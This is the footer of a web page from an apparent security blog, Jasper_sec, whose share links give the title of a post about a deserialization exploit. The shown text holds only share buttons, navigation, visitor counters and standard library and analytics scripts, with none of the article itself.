  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&name=某v10 channel 反序列化 出网通杀&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&t=某v10 channel 反序列化 出网通杀"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Jasper_sec
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
      <ul>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">
          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
        </span>
        <span id="busuanzi_container_site_uv">
          本站访客数 <span id="busuanzi_value_site_uv"></span>人
        </span>
        <span id="busuanzi_container_page_uv">
          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
        </span>
      </ul>
    </nav>
  </div>

</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
